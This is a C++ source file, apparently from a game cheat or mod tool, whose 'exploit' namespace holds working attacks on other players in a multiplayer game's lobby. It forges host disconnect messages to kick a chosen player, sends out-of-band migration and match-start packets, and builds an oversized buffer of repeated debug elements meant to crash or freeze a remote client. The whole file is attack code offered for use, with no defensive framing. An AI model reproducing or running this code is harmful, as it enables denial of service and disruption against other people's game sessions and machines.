#include "dependencies/stdafx.hpp"
#include "exploit.hpp"

namespace exploit
{
	namespace instant_message
	{
		void send_popup(const uint64_t xuid)
		{
			const auto message{ 0 };
			game::send_instant_message({ xuid }, 'f', &message, sizeof message);
		}
	}

	namespace lobby_msg
	{
		void send_disconnect_client(const game::netadr_t& netadr, const uint64_t xuid, const uint64_t target_xuid, const game::LobbyType type)
		{
			char buffer[0x100] = { 0 };
			game::msg_t msg{};

			msg.init_lobby_write(buffer, game::MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);

			msg.write_lobby<uint32_t>(4, game::MESSAGE_ELEMENT_UINT32);
			msg.write_lobby<int>(type, game::MESSAGE_ELEMENT_INT32);
			msg.write_lobby<uint64_t>(target_xuid, game::MESSAGE_ELEMENT_XUID);
			msg.write_lobby<int>(game::LOBBY_DISCONNECT_CLIENT_BADDLC, game::MESSAGE_ELEMENT_INT32);

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_HOST, msg, netadr, xuid);
		}

		void send_disconnect_client(const uint64_t target_xuid)
		{
			const auto session = game::session_data();
			
			if (session == nullptr)
				return; 
			
			return send_disconnect_client(session->host.info.netadr, session->host.info.xuid, target_xuid, session->type);
		}
	}

	void send_connect_response_migration_packet(const game::netadr_t& netadr)
	{
		game::net::oob::send(netadr, "connectResponseMigration\n");
	}

	void send_mstart_packet(const game::netadr_t& netadr)
	{
		game::net::oob::send(netadr, "mstart\n");
	}

	void send_crash(const game::netadr_t& netadr, const std::uint64_t xuid, const bool freeze)
	{
		PRINT_LOG("Sending crash packets to %s", utils::get_sender_string(netadr).data());

		char buf[0x10000] = { 0 };
		game::msg_t msg{};

		msg.init_lobby_write(buf, game::MESSAGE_TYPE_INFO_REQUEST);

		while (msg.cursize < msg.maxsize)
		{
			msg.write<uint8_t>(game::MESSAGE_ELEMENT_DEBUG_START);
			msg.write<uint8_t>(game::MESSAGE_ELEMENT_DEBUG_END);
		}

		events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_CLIENT, msg, netadr, xuid);
	}
}